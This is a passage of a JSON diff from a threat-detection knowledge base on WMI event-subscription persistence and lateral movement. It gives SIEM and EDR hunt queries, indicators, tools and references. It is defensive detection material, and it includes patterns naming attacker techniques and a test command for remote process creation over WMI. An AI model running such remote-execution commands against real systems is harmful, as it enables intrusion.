sourcetype=ProcessRollup2\n(ImageFileName=\"*\\\\WmiPrvSE.exe\" OR ImageFileName=\"*\\\\wmic.exe\")\n| eval is_suspicious=if(\n    match(CommandLine, \"(?i)(powershell|cmd\\\\.exe|__EventFilter|__EventConsumer|Win32_Process|/node:)\"),\n    1, 0)\n| where is_suspicious=1\n| table _time, ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName\n| sort -_time\n\n\n// SentinelOne (Visibility/XQL query)\nDataSource IN [PROCESS, NETWORK]\nWHERE (\n    ProcessName IN [\"WmiPrvSE.exe\", \"wmic.exe\", \"mofcomp.exe\", \"scrcons.exe\"]\n    OR ProcessCommandLine ContainsCIS \"__EventFilter\"\n    OR ProcessCommandLine ContainsCIS \"__EventConsumer\"\n    OR ProcessCommandLine ContainsCIS \"/node:\"\n)\nAND (\n    ProcessCommandLine ContainsCIS \"powershell\"\n    OR ProcessCommandLine ContainsCIS \"cmd.exe\"\n    OR NetConnectionDirection = \"OUTGOING\"\n)\n\n\n// Carbon Black (Custom Threat Hunt)\nprocess_name:(WmiPrvSE.exe OR wmic.exe OR scrcons.exe OR mofcomp.exe)\nAND (process_cmdline:(*__EventFilter* OR *__EventConsumer* OR *Win32_Process* OR */node:*))\n*/\n\n\n// Threat Hunting Guide:\n// 1. Run Query 5 weekly to identify persistent WMI subscriptions across enterprise\n// 2. Baseline legitimate WMI usage in your environment (IT management tools)\n// 3. Create allowlist for known-good WMI consumers (e.g., SCCM, monitoring agents)\n// 4. Alert on any new WMI subscriptions not in allowlist\n// 5. Correlate WMI events with:\n//    - Recent phishing campaigns (initial access)\n//    - Privilege escalation attempts\n//    - Credential theft (Mimikatz, etc.)\n//    - Lateral movement indicators (SMB, RDP, PSExec)\n// 6. Investigate accounts used for remote WMI - should be service accounts or admins only"
+      },
+      "tools": [
+        {
+          "name": "Microsoft Defender for Endpoint",
+          "type": "EDR Platform",
+          "cost": "Subscription (Microsoft 365 E5 or standalone)",
+          "url": "https://www.microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint"
+        },
+        {
+          "name": "CrowdStrike Falcon",
+          "type": "EDR Platform",
+          "cost": "Subscription (per endpoint)",
+          "url": "https://www.crowdstrike.com/products/endpoint-security/"
+        },
+        {
+          "name": "SentinelOne Singularity",
+          "type": "EDR Platform",
+          "cost": "Subscription (per endpoint)",
+          "url": "https://www.sentinelone.com/"
+        },
+        {
+          "name": "Carbon Black (VMware)",
+          "type": "EDR Platform",
+          "cost": "Subscription (per endpoint)",
+          "url": "https://www.vmware.com/products/carbon-black-cloud.html"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.4.1 - Event logging",
+        "A.16.1.2 - Reporting information security events",
+        "A.16.1.4 - Assessment of information security events",
+        "A.16.1.5 - Response to information security incidents"
+      ],
+      "nist_csf": [
+        "DE.AE-2 - Detected events are analyzed",
+        "DE.AE-5 - Incident alert thresholds are established",
+        "DE.CM-4 - Malicious code is detected",
+        "DE.CM-7 - Monitoring for unauthorized activity is continuous",
+        "RS.AN-1 - Notifications are investigated"
+      ],
+      "validation_steps": [
+        "Deploy EDR agent to test systems",
+        "Import custom detection rules (KQL queries above)",
+        "Configure automated response actions in EDR console",
+        "Test detection: Create WMI event subscription using PowerShell (see attack scenario)",
+        "Verify EDR alert generated within 1-5 minutes",
+        "Check automated response actions executed (isolation, investigation, etc.)",
+        "Run threat hunting queries (Query 5) to establish baseline of WMI usage",
+        "Create allowlist for legitimate WMI consumers in your environment",
+        "Test remote WMI detection: Execute wmic /node:[remote-host] process call create \"calc.exe\"",
+        "Verify lateral movement alert and investigate timeline in EDR console"
+      ]
+    }
+  ],
+  "detection": {
+    "indicators": [
+      "Sysmon Event ID 19 (WmiEventFilter activity detected) - creation of WMI event filter",
+      "Sysmon Event ID 20 (WmiEventConsumer activity detected) - creation of WMI event consumer",
+      "Sysmon Event ID 21 (WmiEventConsumerToFilter activity detected) - binding of filter to consumer",
+      "Windows Event ID 5857-5861 (WMI-Activity/Operational log) - WMI activity and errors",
+      "Process creation: WmiPrvSE.exe spawning suspicious child processes (cmd.exe, powershell.exe, mshta.exe, rundll32.exe)",
+      "Process creation: scrcons.exe (WMI Standard Event Consumer) executing CommandLineEventConsumer payloads",
+      "Network connections from WmiPrvSE.exe to external IPs or internal lateral movement targets (port 135, 5985/5986, dynamic RPC 49152-65535)",
+      "PowerShell commands containing: Set-WmiInstance, New-CimInstance, __EventFilter, __EventConsumer, __FilterToConsumerBinding, root\\\\subscription",
+      "WMIC.exe commands containing: /node:, process call create, __EventFilter, __EventConsumer",
+      "MOF file compilation: mofcomp.exe executing with .mof files outside of C:\\\\Windows\\\\System32",
+      "WMI event subscription names with high entropy or mimicking Windows components (e.g., 'BfeOnServiceStartTypeChange', 'WindowsUpdateCheck')",
+      "Remote authentication to DCOM (port 135) or WinRM (5985/5986) followed by wmiprvse.exe execution",
+      "WMI queries for reconnaissance: Win32_ComputerSystem, Win32_OperatingSystem, Win32_Process, Win32_UserAccount via remote systems"
+    ],
+    "log_sources": [
+      "Sysmon Event ID 19, 20, 21 (WMI event subscription activity)",
+      "Sysmon Event ID 1 (Process creation - WmiPrvSE.exe, scrcons.exe, wmic.exe, mofcomp.exe)",
+      "Sysmon Event ID 3 (Network connections - WMI remote access)",
+      "Windows Security Event ID 4688 (Process creation)",
+      "Windows Event ID 5857-5861 (WMI-Activity/Operational log)",
+      "PowerShell Operational Log Event ID 4103, 4104 (Script Block Logging)",
+      "PowerShell Transcripts (if enabled)",
+      "EDR telemetry (process, network, WMI event subscription tracking)",
+      "Windows Firewall logs (connections to DCOM/WinRM ports)",
+      "Active Directory authentication logs (remote WMI access using domain credentials)"
+    ],
+    "log_queries": [
+      {
+        "siem": "Azure Sentinel (KQL)",
+        "query": "// Detect WMI persistence via event subscriptions\nSysmonEvent\n| where EventID in (19, 20, 21) // WMI event filter, consumer, binding\n| extend EventType = case(\n    EventID == 19, \"WmiEventFilter\",\n    EventID == 20, \"WmiEventConsumer\",\n    EventID == 21, \"WmiEventConsumerToFilter\",\n    \"Unknown\"\n)\n| extend ConsumerType = tostring(parse_xml(EventData).DataItem.EventData.Data[4].'#text')\n| extend ConsumerName = tostring(parse_xml(EventData).DataItem.EventData.Data[2].'#text')\n| extend FilterName = tostring(parse_xml(EventData).DataItem.EventData.Data[2].'#text')\n| extend Query = tostring(parse_xml(EventData).DataItem.EventData.Data[5].'#text')\n// Flag suspicious patterns\n| extend IsSuspicious = \n    ConsumerName !startswith \"Microsoft\" and\n    ConsumerName !startswith \"Windows\" and\n    (\n        Query contains \"__InstanceModificationEvent\" or\n        Query contains \"Win32_LocalTime\" or\n        Query contains \"Win32_PerfFormattedData\" or\n        ConsumerType == \"CommandLineEventConsumer\" or\n        ConsumerType == \"ActiveScriptEventConsumer\"\n    )\n| where IsSuspicious == true\n| project TimeGenerated, Computer, User, EventType, ConsumerName, FilterName, Query, ConsumerType\n| order by TimeGenerated desc"
+      },
+      {
+        "siem": "Splunk (SPL)",
+        "query": "index=windows sourcetype=\"WinEventLog:Sysmon\" (EventCode=19 OR EventCode=20 OR EventCode=21)\n| rex field=_raw \"Consumer=\\\"(?<ConsumerName>[^\\\"]+)\\\"\"\n| rex field=_raw \"Filter=\\\"(?<FilterName>[^\\\"]+)\\\"\"\n| rex field=_raw \"Query=\\\"(?<Query>[^\\\"]+)\\\"\"\n| eval is_suspicious=if(\n    (NOT match(ConsumerName, \"(?i)(Microsoft|Windows)\")) AND\n    (match(Query, \"(?i)(__InstanceModificationEvent|Win32_LocalTime|Win32_PerfFormattedData)\") OR\n     match(_raw, \"(?i)(CommandLineEventConsumer|ActiveScriptEventConsumer)\")),\n    1, 0)\n| where is_suspicious=1\n| table _time, Computer, User, EventCode, ConsumerName, FilterName, Query\n| sort -_time"
+      },
+      {
+        "siem": "Elastic Stack (EQL)",
+        "query": "// WMI event subscription creation sequence\nsequence by host.name with maxspan=5m\n  [process where event.code == \"1\" and \n   process.name == \"powershell.exe\" and\n   (process.command_line like \"*Set-WmiInstance*root\\\\subscription*\" or\n    process.command_line like \"*New-CimInstance*root/subscription*\" or\n    process.command_line like \"*__EventFilter*\")]\n  [any where event.provider == \"Microsoft-Windows-Sysmon\" and\n   event.code in (\"19\", \"20\", \"21\")]\n  [process where event.code == \"1\" and\n   process.parent.name == \"WmiPrvSE.exe\" and\n   process.name in (\"cmd.exe\", \"powershell.exe\", \"mshta.exe\", \"rundll32.exe\")]"
+      },
+      {
+        "siem": "Microsoft Sentinel (KQL) - Remote WMI Lateral Movement",
+        "query": "// Detect remote WMI execution for lateral movement\nlet RemoteWMI = \n    SecurityEvent\n    | where EventID == 4688 // Process creation\n    | where NewProcessName endswith \"\\\\\\\\wmic.exe\" or\n            NewProcessName endswith \"\\\\\\\\WmiPrvSE.exe\"\n    | where CommandLine contains \"/node:\" or\n            CommandLine contains \"/NODE:\" or\n            CommandLine contains \"Win32_Process\" or\n            CommandLine contains \"process call create\"\n    | extend TargetHost = extract(@\"/[Nn][Oo][Dd][Ee]:([^\\\\s]+)\", 1, CommandLine)\n    | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, TargetHost;\nlet WMINetworkConnections =\n    SysmonEvent\n    | where EventID == 3 // Network connection\n    | where Image endswith \"\\\\\\\\WmiPrvSE.exe\"\n    | where DestinationPort in (135, 5985, 5986) or\n            (DestinationPort >= 49152 and DestinationPort <= 65535)\n    | extend IsPrivateIP = \n            DestinationIp startswith \"10.\" or\n            DestinationIp startswith \"172.\" or\n            DestinationIp startswith \"192.168.\"\n    | where IsPrivateIP == true\n    | project TimeGenerated, Computer, User, DestinationIp, DestinationPort, Image;\nRemoteWMI\n| join kind=inner (\n    WMINetworkConnections\n) on Computer\n| where TimeGenerated between ((TimeGenerated1 - 2m) .. (TimeGenerated1 + 2m))\n| project TimeGenerated, Computer, Account, CommandLine, TargetHost, DestinationIp, DestinationPort\n| order by TimeGenerated desc"
+      }
+    ],
+    "tools": [
+      {
+        "name": "Sysmon",
+        "type": "System Activity Monitor",
+        "usage": "sysmon64.exe -accepteula -i sysmon-wmi-config.xml (see MIT-001 for configuration)",
+        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
+      },
+      {
+        "name": "Autoruns",
+        "type": "WMI Event Subscription Scanner",
+        "usage": "autoruns.exe > WMI tab shows all event subscriptions | autorunsc.exe -accepteula -a * -c (CLI mode)",
+        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns"
+      },
+      {
+        "name": "WMI-Parser",
+        "type": "PowerShell WMI Forensics",
+        "usage": "Get-WmiEvent (parse WMI repository for event subscriptions and historical activity)",
+        "url": "https://github.com/mattifestation/WMI-Parser"
+      },
+      {
+        "name": "Get-WmiObject / Get-CimInstance",
+        "type": "Native PowerShell WMI Query",
+        "usage": "Get-WmiObject -Namespace root\\\\subscription -Class __EventFilter (enumerate event subscriptions)",
+        "url": "https://docs.microsoft.com/en-us/powershell/"
+      },
+      {
+        "name": "WMI Explorer",
+        "type": "GUI WMI Browser",
+        "usage": "Visual exploration of WMI namespaces, classes, and instances",
+        "url": "https://github.com/vinaypamnani/wmie2/"
+      },
+      {
+        "name": "Microsoft Defender for Endpoint",
+        "type": "EDR Platform",
+        "usage": "Built-in WMI persistence detection via behavioral analytics and custom detection rules",
+        "url": "https://www.microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint"
+      }
+    ]
+  },
+  "metadata_tags": {
+    "industry": [
+      "Financial Services",
+      "Healthcare",
+      "Government",
+      "Defense",
+      "Critical Infrastructure",
+      "Technology",
+      "Telecommunications",
+      "Energy",
+      "Manufacturing",
+      "Retail",
+      "Managed Security Service Providers (MSSPs)"
+    ],
+    "compliance": [
+      "PCI-DSS 3.2.1 (Requirement 10.2.2 - All actions by privileged users)",
+      "HIPAA (45 CFR 164.312(b) - Audit Controls)",
+      "SOC2 (CC6.1, CC6.8, CC7.2 - Logical Access, System Monitoring)",
+      "ISO27001:2013 (A.9.2.3 - Privileged access rights, A.12.4.1 - Event logging)",
+      "NIST 800-53 Rev 5 (AU-2 - Event Logging, AU-6 - Audit Review, SI-4 - System Monitoring)",
+      "CIS Controls v8 (8.2 - Collect Audit Logs, 8.5 - Collect Detailed Audit Logs)",
+      "CMMC Level 3 (AU.L2-3.3.1 - Audit records, SI.L2-3.14.1 - System monitoring)",
+      "GDPR Article 32 (Security of processing - logging and monitoring)",
+      "FISMA (Federal Information Security Management Act)",
+      "NERC CIP (North American Electric Reliability Corporation Critical Infrastructure Protection)"
+    ],
+    "deployment": [
+      "On-Premise",
+      "Hybrid Cloud",
+      "Active Directory Domains",
+      "Azure Active Directory",
+      "Virtual Desktop Infrastructure (VDI)",
+      "Azure Virtual Desktop",
+      "Amazon WorkSpaces",
+      "Citrix Virtual Apps and Desktops",
+      "Physical Endpoints",
+      "Virtual Machines"
+    ],
+    "data_classification": [
+      "Confidential",
+      "Restricted",
+      "Internal",
+      "Sensitive",
+      "Proprietary",
+      "Intellectual Property",
+      "Personally Identifiable Information (PII)",
+      "Protected Health Information (PHI)",
+      "Financial Data",
+      "Government Classified (for defense contractors)"
+    ]
+  },
+  "references": {
+    "documentation": [
+      "https://attack.mitre.org/techniques/T1546/003/ - MITRE ATT&CK: WMI Event Subscription",
+      "https://attack.mitre.org/techniques/T1047/ - MITRE ATT&CK: Windows Management Instrumentation",
+      "https://attack.mitre.org/techniques/T1021/006/ - MITRE ATT&CK: Windows Remote Management",
+      "https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page - Windows Management Instrumentation SDK",
+      "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon - Sysmon Documentation",
+      "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5857 - WMI Activity Events",
+      "https://learn.microsoft.com/en-us/powershell/scripting/learn/security-features - PowerShell Security Features"
+    ],
+    "research_papers": [
+      "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf - FireEye: WMI Offense, Defense, and Forensics (2015)",
+      "https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf - Black Hat 2015: Abusing WMI (Matt Graeber)",
+      "https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf - JPCERT/CC: Detecting Lateral Movement through Tracking Event Logs",
+      "https://www.fireeye.com/blog/threat-research/2015/07/hammertoss_stealthy.html - FireEye: APT29 HAMMERTOSS Analysis",
+      "https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html - FireEye: APT32 OceanLotus WMI Persistence",
+      "https://www.sentinelone.com/labs/inside-trickbots-elaborate-wmi-based-lateral-movement-module/ - SentinelOne: TrickBot WMI Module Analysis",
+      "https://redcanary.com/blog/threat-detection/wmi/ - Red Canary: Living Off The Land - WMI Detection"
+    ],
+    "tools": [
+      "https://github.com/mattifestation/WMI-Parser - WMI-Parser (PowerShell WMI forensics toolkit)",
+      "https://github.com/olafhartong/sysmon-modular - Sysmon Modular Configuration",
+      "https://github.com/SwiftOnSecurity/sysmon-config - SwiftOnSecurity Sysmon Configuration",
+      "https://github.com/vinaypamnani/wmie2 - WMI Explorer (GUI tool)",
+      "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1546.003 - Atomic Red Team T1546.003 Tests",
+      "https://github.com/PowerShellMafia/PowerSploit - PowerSploit (includes WMI persistence modules)",
+      "https://github.com/SecureAuthCorp/impacket - Impacket (wmiexec.py for testing)"
+    ],
+    "cve_databases": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-8415 - CVE-2018-8415: Windows WMI Service EoP",
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-8628 - CVE-2017-8628: Windows WMI Information Disclosure",
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-0718 - CVE-2020-0718: Windows WMI EoP",
+      "https://msrc.microsoft.com/update-guide - Microsoft Security Response Center Update Guide",
+      "https://cve.mitre.org/ - MITRE CVE Database"
+    ]
+  }
+}
